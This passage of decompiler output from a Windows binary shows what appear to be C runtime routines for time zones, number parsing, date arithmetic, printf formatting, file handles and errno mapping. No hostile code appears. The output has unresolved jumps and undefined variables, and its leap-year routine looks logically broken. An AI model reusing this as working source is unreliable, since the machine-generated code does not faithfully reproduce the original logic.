    return sub_4046D0(a1, ":(%04.4hu)%02.2hu%02.2hu%02.2hu", *a2, a2[1], a2[3], v4);
  if ( a2[3] == 5 )
    return sub_4046D0(a1, ":%02.2hu31%02.2hu-%1.1hu", a2[1], v4, a2[2]);
  return sub_4046D0(a1, ":%02.2hu%02.2hu%02.2hu+%1.1hu", a2[1], 7 * a2[3] - 6, v4, a2[2]);
}

//----- (00407500) --------------------------------------------------------
const char *sub_407500()
{
  DWORD v0; // eax
  int v2; // [esp+4h] [ebp-B0h]
  int v3; // [esp+4h] [ebp-B0h]
  struct _TIME_ZONE_INFORMATION TimeZoneInformation; // [esp+8h] [ebp-ACh] BYREF

  v0 = GetTimeZoneInformation(&TimeZoneInformation);
  if ( v0 == -1 )
    return ":";
  if ( v0 )
  {
    v2 = sub_4046D0((int)byte_416F2C, ":UTC:UTC:%+04.4ld", 100 * TimeZoneInformation.Bias / -60);
    v3 = v2
       + sub_407440(
           (int)&byte_416F2C[v2],
           &TimeZoneInformation.DaylightDate.wYear,
           (__int16)(LOWORD(TimeZoneInformation.StandardBias) + LOWORD(TimeZoneInformation.Bias)) / 60);
    sub_407440(
      (int)&byte_416F2C[v3],
      &TimeZoneInformation.StandardDate.wYear,
      (__int16)(LOWORD(TimeZoneInformation.DaylightBias) + LOWORD(TimeZoneInformation.Bias)) / 60);
  }
  else
  {
    sub_4046D0((int)byte_416F2C, ":UTC:UTC:%+04.4ld", 100 * TimeZoneInformation.Bias / -60);
    sub_403780(byte_416F2C, ":(2099)1231");
  }
  return byte_416F2C;
}

//----- (00407650) --------------------------------------------------------
unsigned int __cdecl sub_407650(unsigned __int8 *a1, unsigned __int8 **a2, int a3)
{
  unsigned int v3; // ebx
  unsigned __int8 *i; // esi
  int v5; // eax
  char *v6; // eax
  int v8; // eax
  int v9; // eax
  unsigned int v10; // edi
  char v11; // [esp-20h] [ebp-24h]
  unsigned __int8 *v12; // [esp-1Ch] [ebp-20h]
  unsigned __int8 *v13; // [esp-18h] [ebp-1Ch]
  char v14; // [esp-11h] [ebp-15h]
  int v15; // [esp-10h] [ebp-14h]
  unsigned int v16; // [esp-Ch] [ebp-10h]
  unsigned __int8 *v17; // [esp-8h] [ebp-Ch]
  unsigned __int8 v18; // [esp-1h] [ebp-5h]

  v3 = a3;
  for ( i = a1; (*((_WORD *)off_416304 + *i) & 0x60) != 0; ++i )
    ;
  v5 = *i;
  if ( v5 == 45 || v5 == 43 )
  {
    v6 = (char *)i++;
    v11 = *v6;
  }
  else
  {
    v11 = 43;
  }
  v14 = v11;
  if ( a3 < 0 || a3 == 1 || a3 > 36 )
  {
    if ( a2 )
      *a2 = a1;
    return 0;
  }
  else
  {
    if ( a3 <= 0 )
    {
      if ( *i == 48 )
      {
        v9 = i[1];
        if ( v9 == 120 || v9 == 88 )
        {
          v3 = 16;
          i += 2;
        }
        else
        {
          v3 = 8;
        }
      }
      else
      {
        v3 = 10;
      }
    }
    else if ( a3 == 16 && *i == 48 )
    {
      v8 = i[1];
      if ( v8 == 120 || v8 == 88 )
        i += 2;
    }
    v13 = i;
    while ( *i == 48 )
      ++i;
    v10 = 0;
    v12 = i;
    while ( 1 )
    {
      v17 = sub_408680("0123456789abcdefghijklmnopqrstuvwxyz", *((_WORD *)off_415A60 + *i), v3);
      if ( !v17 )
        break;
      v16 = v10;
      v18 = (_BYTE)v17 - (unsigned __int8)"0123456789abcdefghijklmnopqrstuvwxyz";
      v10 = v18 + v10 * v3;
      ++i;
    }
    if ( v13 == i )
    {
      if ( a2 )
        *a2 = a1;
      return 0;
    }
    else
    {
      v15 = i - v12 - (unsigned __int8)byte_411E51[v3];
      if ( v15 >= 0 && (v15 > 0 || v10 < v10 - v18 || (v10 - v18) / v3 != v16) )
      {
        dword_415C84 = 34;
        i = a1;
        v10 = -1;
        v14 = 43;
      }
      if ( v14 == 45 )
        v10 = -v10;
      if ( a2 )
        *a2 = i;
      return v10;
    }
  }
}
// 407793: variable 'v18' is possibly undefined
// 4077AA: variable 'v16' is possibly undefined
// 415A60: using guessed type void *off_415A60;
// 415C84: using guessed type int dword_415C84;
// 416304: using guessed type void *off_416304;

//----- (004077E0) --------------------------------------------------------
int __cdecl sub_4077E0(_DWORD *a1)
{
  char *v1; // esi
  BOOL v3; // edi
  unsigned __int8 *i; // esi
  int v5; // eax
  int v6; // [esp-18h] [ebp-1Ch]
  int v7; // [esp-14h] [ebp-18h]
  BOOL v8; // [esp-14h] [ebp-18h]
  int v9; // [esp-10h] [ebp-14h]
  int v10; // [esp-Ch] [ebp-10h]
  int v11; // [esp-8h] [ebp-Ch]
  int v12; // [esp-4h] [ebp-8h] BYREF

  if ( (void *)dword_416308 != off_415D28 )
  {
    if ( !*(_BYTE *)off_415D28 )
    {
      if ( !*(_BYTE *)off_415D2C )
        off_415D2C = (void *)sub_405540();
      off_415D28 = sub_4055B0((char *)off_415D2C, 3, &v12);
      if ( *(_BYTE *)off_415D28 )
        off_415D28 = (char *)off_415D28 - 1;
    }
    v1 = sub_409CF0((unsigned __int8 *)off_415D28);
    if ( !v1 )
      return -1;
    sub_404670((char *)dword_41630C);
    dword_41630C = v1;
    dword_416308 = (int)off_415D28;
  }
  v3 = 0;
  v12 = sub_405710(a1[5], 0);
  v11 = a1[2] + 24 * a1[7];
  v10 = (v12 + 365 * a1[5] + 1) % 7 + 14;
  for ( i = (unsigned __int8 *)dword_41630C; *i != 0xFF; i += 5 )
  {
    if ( i[4] <= (int)a1[5] )
    {
      v5 = sub_405710(a1[5], i[3]);
      v9 = i[2] + v5 - v12;
      if ( *i )
      {
        v7 = (v10 + v9 - *i) % 7;
        v6 = v7 ? 7 - v7 : 0;
        v9 += v6;
        if ( *i <= 7u )
          v9 -= 7;
      }
      if ( v11 < i[1] + 24 * v9 )
        return v3;
      v8 = i[4] == i[9] && !v3;
      v3 = v8;
    }
  }
  return v3;
}
// 415D28: using guessed type void *off_415D28;
// 415D2C: using guessed type void *off_415D2C;
// 416308: using guessed type int dword_416308;

//----- (00407990) --------------------------------------------------------
char *__cdecl sub_407990(int a1, int a2, int a3, int *a4, char a5, int a6)
{
  int v6; // esi
  int v7; // edi
  int v9; // ebx
  char *v10; // [esp-4h] [ebp-8h]

  v6 = a2;
  v7 = a3;
  if ( a2 < 0 )
    v6 = 0;
  if ( a5 == 79 )
  {
    v10 = sub_4055B0(*(char **)(a6 + 72), v6, a4);
    if ( *a4 > 0 )
      return v10;
  }
  *a4 = a3;
  v9 = a3 + a1;
  *(_BYTE *)(a3 + a1) = 0;
  while ( --v7 >= 0 )
  {
    *(_BYTE *)--v9 = v6 % 10 + 48;
    v6 /= 10;
  }
  return (char *)v9;
}

//----- (00407A20) --------------------------------------------------------
BOOL __cdecl sub_407A20(int a1)
{
  return !(a1 / 4) && (a1 / 100 || a1 > 0 && a1 / 400 == 100 || a1 < 0 && a1 / -400 == 300);
}

//----- (00407AA0) --------------------------------------------------------
int __cdecl sub_407AA0(int a1, int a2, int a3)
{
  return (a3 + 7 - (a2 + 7 - a1) % 7) / 7;
}

//----- (00407AE0) --------------------------------------------------------
int __cdecl sub_407AE0(int a1, int a2, int a3)
{
  int v3; // ebx
  int v4; // edi
  int v5; // esi
  int v7; // [esp+Ch] [ebp-8h]
  BOOL v8; // [esp+10h] [ebp-4h]

  v7 = sub_407AA0(1, a2, a3);
  v8 = sub_407A20(a1);
  v3 = a3 - v8;
  v4 = (a2 + 371 - a3) % 7;
  v5 = (v8 + v4 + 365) % 7;
  if ( a3 - v8 >= 364 && v5 == 2 || v3 >= 363 && v5 == 3 || v3 >= 362 && v5 == 4 )
    return -1;
  if ( v4 == 2 || v4 == 3 || v4 == 4 )
    ++v7;
  return v7;
}

//----- (00407B90) --------------------------------------------------------
int __cdecl sub_407B90(int a1, int a2, int a3)
{
  int result; // eax
  BOOL v4; // eax

  result = sub_407AE0(a1, a2, a3);
  if ( result )
  {
    if ( result <= 0 )
      return 1;
  }
  else
  {
    v4 = sub_407A20(a1 - 1);
    return sub_407AE0(a1 - 1, a2 + 7 - a3, v4 + 365);
  }
  return result;
}

//----- (00407BF0) --------------------------------------------------------
int __cdecl sub_407BF0(int a1, int a2, int a3)
{
  int v3; // eax

  v3 = sub_407AE0(a1, a2, a3);
  if ( !v3 )
    return a1 - 1;
  if ( v3 <= 0 )
    return a1 + 1;
  return a1;
}

//----- (00407C30) --------------------------------------------------------
int __cdecl sub_407C30(_DWORD *a1, unsigned __int8 *a2)
{
  signed int v2; // edi
  unsigned __int8 *v4; // esi
  signed int v5; // edi
  signed int v6; // edi
  unsigned __int8 *v7[2]; // [esp-4h] [ebp-8h] BYREF

  v2 = sub_405630(a2, v7, 10);
  if ( a2 == v7[0] || *v7[0] != 47 )
    return 2;
  if ( v2 != a1[5] + 1900 )
    return a1[5] + 1900 < v2 ? -1 : 1;
  v4 = v7[0] + 1;
  v5 = sub_405630(v7[0] + 1, v7, 10);
  if ( v4 == v7[0] || *v7[0] != 47 )
    return 2;
  if ( v5 != a1[4] + 1 )
    return a1[4] + 1 < v5 ? -1 : 1;
  v6 = sub_405630(v7[0] + 1, v7, 10);
  if ( v4 == v7[0] )
    return 2;
  if ( v6 == a1[3] )
    return 0;
  return a1[3] < v6 ? -1 : 1;
}

//----- (00407D20) --------------------------------------------------------
const char *__cdecl sub_407D20(_DWORD *a1, int a2)
{
  char *i; // eax
  unsigned __int8 *v3; // eax
  unsigned int v4; // eax
  unsigned __int8 *v5; // edi
  unsigned int v7; // eax
  char *v8; // ebx
  int v9; // [esp-8h] [ebp-Ch]
  _DWORD v10[2]; // [esp-4h] [ebp-8h] BYREF

  v9 = 0;
  for ( i = sub_4055B0(*(char **)(a2 + 68), 0, v10); ; i = sub_4055B0(*(char **)(a2 + 68), v9, v10) )
  {
    v8 = i;
    if ( !*i )
      break;
    v3 = (unsigned __int8 *)sub_4055B0(i + 1, 1, v10);
    v4 = sub_407C30(a1, v3);
    if ( *v8 == 45 && (v4 == -1 || !v4) || *v8 == 43 && v4 <= 1 )
    {
      v5 = (unsigned __int8 *)sub_4055B0(v8 + 1, 2, v10);
      if ( *v5 == (unsigned __int8)*v8 && v5[1] == 42 )
        return v8;
      v7 = sub_407C30(a1, v5);
      if ( *v8 == 45 && v7 < 2 )
        return v8;
      if ( *v8 == 43 && (v7 == -1 || !v7) )
        return v8;
    }
    ++v9;
  }
  return "+:";
}

//----- (00407E10) --------------------------------------------------------
unsigned __int8 *__cdecl sub_407E10(int a1, int a2, int a3, unsigned __int8 a4, _DWORD *a5, unsigned __int8 *a6)
{
  unsigned __int8 *v6; // edi

  if ( a4 == 37 )
  {
    v6 = (unsigned __int8 *)&unk_411F60;
    *a5 = 1;
  }
  else
  {
    if ( a4 >= 0x41u && a4 <= 0x7Au )
      __asm { jmp     dword ptr ds:asc_411D60+14h[eax*4]; "            " }
    *a6 = a4;
    a6[1] = 0;
    v6 = a6;
    *a5 = 2;
  }
  return v6;
}

//----- (00408570) --------------------------------------------------------
int __cdecl sub_408570(int a1)
{
  LPVOID v2; // eax

  if ( *(_DWORD *)(a1 + 16) < *(_DWORD *)(a1 + 24) )
    return 0;
  if ( (*(_WORD *)a1 & 0x9002) == 2 )
  {
    if ( (*(_WORD *)a1 & 0x6000) == 24576 && *(_DWORD *)(a1 + 16) >= *(_DWORD *)(a1 + 12) && sub_405C10(a1) )
    {
      return -1;
    }
    else
    {
      if ( (*(_WORD *)a1 & 0xC00) == 0 && *(_DWORD *)(a1 + 8) == a1 + 72 )
      {
        v2 = sub_403DC0(0x200u);
        *(_DWORD *)(a1 + 8) = v2;
        if ( v2 )
        {
          *(_WORD *)a1 |= 0x40u;
          *(_DWORD *)(a1 + 16) = *(_DWORD *)(a1 + 8);
          *(_DWORD *)(a1 + 12) = *(_DWORD *)(a1 + 8) + 512;
          *(_DWORD *)(a1 + 44) = *(_DWORD *)(a1 + 8);
          *(_DWORD *)(a1 + 48) = *(_DWORD *)(a1 + 8);
        }
        else
        {
          *(_DWORD *)(a1 + 8) = a1 + 72;
          *(_DWORD *)(a1 + 16) = *(_DWORD *)(a1 + 8);
          *(_DWORD *)(a1 + 12) = *(_DWORD *)(a1 + 8) + 1;
        }
        sub_404A00();
      }
      *(_DWORD *)(a1 + 20) = *(_DWORD *)(a1 + 8);
      *(_DWORD *)(a1 + 24) = *(_DWORD *)(a1 + 12);
      *(_WORD *)a1 |= 0x6000u;
      return 0;
    }
  }
  else
  {
    *(_WORD *)a1 |= (*(_WORD *)a1 & 0x8000) != 0 ? 512 : 16896;
    return -1;
  }
}
// 404A00: using guessed type int sub_404A00(void);

//----- (00408680) --------------------------------------------------------
unsigned __int8 *__cdecl sub_408680(unsigned __int8 *a1, unsigned __int8 a2, int a3)
{
  while ( a3 )
  {
    if ( *a1 == a2 )
      return a1;
    ++a1;
    --a3;
  }
  return 0;
}

//----- (004086B0) --------------------------------------------------------
void __noreturn sub_4086B0()
{
  sub_409E80(6);
  sub_404BD0(1u);
}
// 4086B0: using guessed type void __noreturn sub_4086B0();

//----- (004086D0) --------------------------------------------------------
int __cdecl sub_4086D0(int a1, _BYTE *lpBuffer, DWORD nNumberOfBytesToWrite)
{
  char *v4; // esi
  char *i; // edi
  char *v6; // eax
  char v7; // bl
  char *v8; // eax
  char *v9; // eax
  char Buffer[1025]; // [esp+Fh] [ebp-411h] BYREF
  int LastError; // [esp+410h] [ebp-10h]
  DWORD v12; // [esp+414h] [ebp-Ch]
  DWORD NumberOfBytesWritten; // [esp+418h] [ebp-8h] BYREF
  int v14; // [esp+41Ch] [ebp-4h]

  if ( a1 < uNumber && (*((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) & 1) != 0 )
  {
    v12 = 0;
    v14 = 0;
    if ( nNumberOfBytesToWrite )
    {
      if ( (*((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) & 0x20) != 0 )
        sub_409FD0(a1, 0, 2u);
      if ( *((char *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) >= 0 )
      {
        if ( WriteFile(
               *((HANDLE *)*(&lpMem + (a1 >> 5)) + 2 * (a1 & 0x1F)),
               lpBuffer,
               nNumberOfBytesToWrite,
               &NumberOfBytesWritten,
               0) )
        {
          LastError = 0;
          v12 = NumberOfBytesWritten;
        }
        else
        {
          LastError = GetLastError();
        }
      }
      else
      {
        v4 = lpBuffer;
        LastError = 0;
        while ( v4 - lpBuffer < nNumberOfBytesToWrite )
        {
          for ( i = Buffer; i - Buffer < 1024 && v4 - lpBuffer < nNumberOfBytesToWrite; ++i )
          {
            v6 = v4++;
            v7 = *v6;
            if ( *v6 == 10 )
            {
              ++v14;
              v8 = i++;
              *v8 = 13;
            }
            v9 = i;
            *v9 = v7;
          }
          if ( !WriteFile(
                  *((HANDLE *)*(&lpMem + (a1 >> 5)) + 2 * (a1 & 0x1F)),
                  Buffer,
                  i - Buffer,
                  &NumberOfBytesWritten,
                  0) )
          {
            LastError = GetLastError();
            break;
          }
          v12 += NumberOfBytesWritten;
          if ( (int)NumberOfBytesWritten < i - Buffer )
            break;
        }
      }
      if ( v12 )
      {
        return v12 - v14;
      }
      else if ( LastError )
      {
        if ( LastError == 5 )
          dword_415C84 = 9;
        else
          sub_408C30(LastError);
        return -1;
      }
      else if ( (*((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) & 0x40) != 0 && *lpBuffer == 26 )
      {
        return 0;
      }
      else
      {
        dword_415C84 = 28;
        return -1;
      }
    }
    else
    {
      return 0;
    }
  }
  else
  {
    dword_415C84 = 9;
    return -1;
  }
}
// 415C84: using guessed type int dword_415C84;

//----- (004088F0) --------------------------------------------------------
int sub_4088F0()
{
  int v0; // edi
  int v1; // esi
  unsigned int i; // ebx
  char *v3; // eax
  char *v4; // ebx

  v0 = -1;
  v1 = 0;
  while ( *(&lpMem + v1) )
  {
    for ( i = (unsigned int)*(&lpMem + v1); i < (unsigned int)*(&lpMem + v1) + 256; i += 8 )
    {
      if ( (*(_BYTE *)(i + 4) & 1) == 0 )
      {
        *(_DWORD *)i = -1;
        v0 = (int)(i - (_DWORD)*(&lpMem + v1)) / 8 + 32 * v1;
        break;
      }
    }
    if ( v0 == -1 && ++v1 < 64 )
      continue;
    return v0;
  }
  v3 = (char *)sub_403DC0(0x100u);
  v4 = v3;
  if ( v3 )
  {
    *(&lpMem + v1) = v3;
    uNumber += 32;
    while ( v4 < (char *)*(&lpMem + v1) + 256 )
    {
      v4[4] = 0;
      *(_DWORD *)v4 = -1;
      v4[5] = 10;
      v4 += 8;
    }
    return 32 * v1;
  }
  return v0;
}

//----- (004089C0) --------------------------------------------------------
int __cdecl sub_4089C0(int a1)
{
  char *v1; // eax

  if ( a1 >= uNumber || (v1 = (char *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F), (v1[4] & 1) == 0) || *(_DWORD *)v1 == -1 )
  {
    dword_415C84 = 9;
    return -1;
  }
  else
  {
    if ( a1 )
    {
      if ( a1 == 1 )
      {
        SetStdHandle(0xFFFFFFF5, 0);
      }
      else if ( a1 == 2 )
      {
        SetStdHandle(0xFFFFFFF4, 0);
      }
    }
    else
    {
      SetStdHandle(0xFFFFFFF6, 0);
    }
    *((_DWORD *)*(&lpMem + (a1 >> 5)) + 2 * (a1 & 0x1F)) = -1;
    return 0;
  }
}
// 415C84: using guessed type int dword_415C84;

//----- (00408A60) --------------------------------------------------------
int __cdecl sub_408A60(int a1, HANDLE hHandle)
{
  if ( a1 < uNumber && *((_DWORD *)*(&lpMem + (a1 >> 5)) + 2 * (a1 & 0x1F)) == -1 )
  {
    if ( a1 )
    {
      if ( a1 == 1 )
      {
        SetStdHandle(0xFFFFFFF5, hHandle);
      }
      else if ( a1 == 2 )
      {
        SetStdHandle(0xFFFFFFF4, hHandle);
      }
    }
    else
    {
      SetStdHandle(0xFFFFFFF6, hHandle);
    }
    *((_DWORD *)*(&lpMem + (a1 >> 5)) + 2 * (a1 & 0x1F)) = hHandle;
    return 0;
  }
  else
  {
    dword_415C84 = 9;
    return -1;
  }
}
// 415C84: using guessed type int dword_415C84;

//----- (00408B00) --------------------------------------------------------
int __cdecl sub_408B00(int a1)
{
  if ( a1 < uNumber && (*((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) & 1) != 0 )
    return *((_DWORD *)*(&lpMem + (a1 >> 5)) + 2 * (a1 & 0x1F));
  dword_415C84 = 9;
  return -1;
}
// 415C84: using guessed type int dword_415C84;

//----- (00408B60) --------------------------------------------------------
int __cdecl sub_408B60(HANDLE hFile, __int16 a2)
{
  char v2; // bl
  DWORD FileType; // eax
  int LastError; // eax
  int v6; // esi

  v2 = 0;
  if ( (a2 & 8) != 0 )
    v2 = 32;
  if ( (a2 & 0x4000) != 0 )
    v2 |= 0x80u;
  if ( (a2 & 0x80u) != 0 )
    v2 |= 0x10u;
  FileType = GetFileType(hFile);
  if ( FileType )
  {
    if ( FileType == 2 )
    {
      v2 |= 0x40u;
    }
    else if ( FileType == 3 )
    {
      v2 |= 8u;
    }
    v6 = sub_4088F0();
    if ( v6 == -1 )
    {
      dword_415C84 = 24;
      return -1;
    }
    else
    {
      sub_408A60(v6, hFile);
      *((_BYTE *)*(&lpMem + (v6 >> 5)) + 8 * (v6 & 0x1F) + 4) = v2 | 1;
      return v6;
    }
  }
  else
  {
    LastError = GetLastError();
    sub_408C30(LastError);
    return -1;
  }
}
// 415C84: using guessed type int dword_415C84;

//----- (00408C30) --------------------------------------------------------
int __cdecl sub_408C30(int a1)
{
  int result; // eax

  if ( a1 == 145 )
    goto LABEL_28;
  if ( a1 <= 145 )
  {
    if ( a1 >= 80 )
    {
      if ( a1 <= 89 )
        return (*(int (**)(void))&a0123456789abcd[4 * a1 + 32])();
      if ( a1 >= 108 )
      {
        if ( a1 <= 114 )
        {
          switch ( a1 )
          {
            case 0:
              JUMPOUT(0x407FCF);
            case 1:
              goto LABEL_39;
            case 2:
            case 4:
            case 5:
            case 8:
            case 10:
            case 12:
            case 15:
              goto LABEL_52;
            case 3:
              JUMPOUT(0x4080A6);
            case 6:
              JUMPOUT(0x4080CA);
            case 7:
              JUMPOUT(0x408111);
            case 9:
              JUMPOUT(0x408121);
            case 11:
              JUMPOUT(0x408142);
            case 13:
              JUMPOUT(0x4081A0);
            case 14:
              JUMPOUT(0x4081C0);
            case 16:
              JUMPOUT(0x408261);
            case 17:
              JUMPOUT(0x4082B6);
            case 18:
              JUMPOUT(0x40830E);
            case 19:
              JUMPOUT(0x40847A);
          }
        }
        if ( a1 >= 128 && a1 <= 132 )
        {
          switch ( a1 )
          {
            case 0:
              JUMPOUT(0x408502);
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
            case 6:
            case 12:
LABEL_52:
              JUMPOUT(0x408546);
            case 7:
              JUMPOUT(0x407E51);
            case 8:
LABEL_39:
              JUMPOUT(0x407E8D);
            case 9:
              JUMPOUT(0x407EC9);
            case 10:
              JUMPOUT(0x407F57);
            case 11:
              JUMPOUT(0x407F8A);
          }
        }
      }
      goto LABEL_25;
    }
    if ( a1 >= 1 && a1 <= 67 )
    {
      switch ( a1 )
      {
        case 0:
        case 112:
          goto LABEL_29;
        case 1:
        case 10:
        case 12:
        case 13:
        case 14:
        case 35:
        case 37:
        case 38:
        case 39:
        case 40:
        case 41:
        case 42:
        case 43:
        case 44:
        case 45:
        case 46:
        case 47:
        case 48:
        case 49:
        case 50:
        case 51:
        case 52:
        case 54:
        case 55:
        case 56:
        case 57:
        case 58:
        case 59:
        case 60:
        case 61:
        case 62:
        case 63:
        case 64:
        case 66:
        case 70:
        case 71:
        case 73:
        case 78:
        case 81:
        case 82:
        case 83:
        case 84:
        case 100:
        case 101:
        case 102:
        case 104:
        case 105:
        case 106:
        case 107:
        case 108:
        case 109:
        case 110:
        case 111:
          goto LABEL_25;
        case 2:
        case 3:
        case 15:
        case 18:
        case 53:
        case 67:
        case 103:
          goto LABEL_26;
        case 4:
          dword_415C84 = 24;
          break;
        case 5:
        case 16:
        case 19:
        case 20:
        case 21:
        case 22:
        case 23:
        case 24:
        case 25:
        case 26:
        case 27:
        case 28:
        case 29:
        case 30:
        case 31:
        case 32:
        case 33:
        case 34:
        case 36:
        case 65:
        case 68:
        case 79:
          goto LABEL_28;
        case 6:
        case 74:
        case 77:
          dword_415C84 = 9;
          break;
        case 7:
        case 8:
        case 9:
          goto LABEL_27;
        case 11:
        case 85:
        case 86:
        case 87:
        case 88:
        case 89:
        case 90:
        case 91:
        case 92:
        case 93:
        case 94:
        case 95:
        case 96:
        case 97:
        case 98:
        case 99:
          dword_415C84 = 8;
          break;
        case 17:
          dword_415C84 = 18;
          break;
        case 69:
          dword_415C84 = 32;
          break;
        case 72:
          dword_415C84 = 28;
          break;
        case 75:
        case 76:
          dword_415C84 = 10;
          break;
        case 80:
          dword_415C84 = 17;
          break;
      }
      return result;
    }
LABEL_25:
    dword_415C84 = 22;
    return result;
  }
  if ( a1 == 164 )
  {
LABEL_29:
    dword_415C84 = 11;
    return result;
  }
  if ( a1 == 167 )
  {
LABEL_28:
    dword_415C84 = 13;
    return result;
  }
  if ( a1 <= 167 )
  {
    if ( a1 != 158 )
    {
      if ( a1 == 161 )
      {
LABEL_26:
        dword_415C84 = 2;
        return result;
      }
      goto LABEL_25;
    }
    goto LABEL_28;
  }
  if ( a1 < 183 )
    goto LABEL_25;
  if ( a1 <= 215 )
    return (*(int (**)(void))&a022hu31022hu11[4 * a1 + 2])();
  result = a1;
  if ( a1 != 1816 )
    goto LABEL_25;
LABEL_27:
  dword_415C84 = 12;
  return result;
}
// 408C7A: control flows out of bounds to 407E8D
// 408C7A: control flows out of bounds to 407FCF
// 408C7A: control flows out of bounds to 4080A6
// 408C7A: control flows out of bounds to 4080CA
// 408C7A: control flows out of bounds to 408111
// 408C7A: control flows out of bounds to 408121
// 408C7A: control flows out of bounds to 408142
// 408C7A: control flows out of bounds to 4081A0
// 408C7A: control flows out of bounds to 4081C0
// 408C7A: control flows out of bounds to 408261
// 408C7A: control flows out of bounds to 4082B6
// 408C7A: control flows out of bounds to 40830E
// 408C7A: control flows out of bounds to 40847A
// 408C7A: control flows out of bounds to 408546
// 408C95: control flows out of bounds to 407E51
// 408C95: control flows out of bounds to 407EC9
// 408C95: control flows out of bounds to 407F57
// 408C95: control flows out of bounds to 407F8A
// 408C95: control flows out of bounds to 408502
// 415C84: using guessed type int dword_415C84;

//----- (00408DA0) --------------------------------------------------------
int __cdecl sub_408DA0(LPCSTR lpFileName)
{
  int LastError; // eax

  if ( DeleteFileA(lpFileName) )
    return 0;
  LastError = GetLastError();
  sub_408C30(LastError);
  return -1;
}

//----- (00408DD0) --------------------------------------------------------
int __cdecl sub_408DD0(int a1)
{
  return a1;
}

//----- (00408DE0) --------------------------------------------------------
int __cdecl sub_408DE0(int a1, unsigned __int16 *a2)
{
  unsigned __int16 *v2; // esi
  int v4; // eax
  int v5; // edi
  int v6; // [esp+Ch] [ebp-64h]
  char v7[64]; // [esp+10h] [ebp-60h] BYREF
  int v8; // [esp+50h] [ebp-20h]
  int v9[2]; // [esp+54h] [ebp-1Ch] BYREF
  SIZE_T dwBytes; // [esp+5Ch] [ebp-14h]
  LPVOID lpMem; // [esp+60h] [ebp-10h]
  char v12[8]; // [esp+64h] [ebp-Ch] BYREF
  int v13; // [esp+6Ch] [ebp-4h]

  v2 = a2;
  if ( *(int *)(a1 + 44) >= 0 )
    v6 = *(_DWORD *)(a1 + 44);
  else
    v6 = 0x7FFFFFFF;
  v13 = v6;
  dwBytes = *(_DWORD *)(a1 + 52) + (unsigned __int8)byte_416310;
  v9[0] = 0;
  v9[1] = 0;
  if ( (*(_WORD *)(a1 + 56) & 4) != 0 || dwBytes <= 0x40 )
  {
    lpMem = v7;
    dwBytes = 64;
  }
  else
  {
    lpMem = sub_403DC0(dwBytes);
    if ( !lpMem )
      return -1;
  }
  if ( !a2 )
    v2 = L"(null)";
  v8 = 0;
  while ( v13 > 0 )
  {
    v4 = sub_40A080(v12, *v2, (int)v9);
    v5 = v4;
    if ( v4 < 0 || !*v2 && (v5 = v4 - 1, v4 - 1 < 0) )
    {
      v8 = -1;
      break;
    }
    if ( v13 < v5 )
      break;
    if ( dwBytes < v5 + *(_DWORD *)(a1 + 20) )
    {
      *(_DWORD *)(a1 + 52) = 0;
      sub_4070F0(a1, (int)lpMem);
      *(_DWORD *)(a1 + 20) = 0;
    }
    sub_404EE0((_BYTE *)lpMem + *(_DWORD *)(a1 + 20), v12, v5);
    *(_DWORD *)(a1 + 20) += v5;
    if ( !*v2 )
      break;
    ++v2;
    v13 -= v5;
  }
  sub_4070F0(a1, (int)lpMem);
  *(_DWORD *)(a1 + 52) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  if ( lpMem != v7 )
    sub_404670((char *)lpMem);
  return v8;
}
// 412378: using guessed type wchar_t aNull[7];
// 416310: using guessed type char byte_416310;

//----- (00408F40) --------------------------------------------------------
int __cdecl sub_408F40(int a1, char a2)
{
  int v2; // edx
  __int64 v3; // rax
  int result; // eax
  int v5; // [esp+Ch] [ebp-4Ch]
  __int64 v6; // [esp+10h] [ebp-48h]
  int v7; // [esp+1Ch] [ebp-3Ch]
  int v8; // [esp+20h] [ebp-38h]
  const char *v9; // [esp+24h] [ebp-34h]
  unsigned __int64 v10; // [esp+28h] [ebp-30h]
  char v11[24]; // [esp+38h] [ebp-20h] BYREF
  int v12; // [esp+50h] [ebp-8h]
  int v13; // [esp+54h] [ebp-4h]

  if ( a2 == 88 )
    v9 = "0123456789ABCDEF";
  else
    v9 = "0123456789abcdef";
  if ( a2 == 111 )
  {
    v8 = 8;
  }
  else
  {
    if ( a2 == 120 || a2 == 88 )
      v7 = 16;
    else
      v7 = 10;
    v8 = v7;
  }
  v12 = v8;
  v13 = 24;
  v10 = *(_QWORD *)a1;
  if ( (a2 == 100 || a2 == 105) && *(int *)(a1 + 4) < 0 )
    v10 = -(__int64)v10;
  if ( v10 || *(_DWORD *)(a1 + 44) )
    v11[--v13] = v9[sub_40A2D0(v12, v10)];
  *(_DWORD *)a1 = sub_4051E0(v12, v10);
  *(_DWORD *)(a1 + 4) = v2;
  while ( *(__int64 *)a1 > 0 && v13 > 0 )
  {
    LODWORD(v3) = sub_40A350(v12, *(_QWORD *)a1);
    v6 = v3;
    v5 = --v13;
    v11[v5] = v9[*(_DWORD *)a1 - (unsigned int)sub_40A400(v3, v12)];
    *(_QWORD *)a1 = v6;
  }
  if ( v12 == 8 && (*(_WORD *)(a1 + 56) & 8) != 0 && (unsigned int)v13 < 0x18 && v11[v13] != 48 )
    v11[--v13] = 48;
  *(_DWORD *)(a1 + 28) = 24 - v13;
  sub_404EE0(*(_BYTE **)(a1 + 16), &v11[v13], *(_DWORD *)(a1 + 28));
  if ( *(_DWORD *)(a1 + 28) >= *(_DWORD *)(a1 + 44) )
  {
    result = a1;
    if ( *(int *)(a1 + 44) < 0 && (*(_WORD *)(a1 + 56) & 0x14) == 16 )
    {
      v13 = *(_DWORD *)(a1 + 52) - *(_DWORD *)(a1 + 20) - *(_DWORD *)(a1 + 24) - *(_DWORD *)(a1 + 28);
      if ( v13 > 0 )
      {
        result = v13;
        *(_DWORD *)(a1 + 24) = v13;
      }
    }
  }
  else
  {
    *(_DWORD *)(a1 + 24) = *(_DWORD *)(a1 + 44) - *(_DWORD *)(a1 + 28);
    result = a1;
    *(_WORD *)(a1 + 56) &= ~0x10u;
  }
  return result;
}
// 409049: variable 'v2' is possibly undefined
// 409067: variable 'v3' is possibly undefined
// 408F40: using guessed type char var_20[24];

//----- (004091A0) --------------------------------------------------------
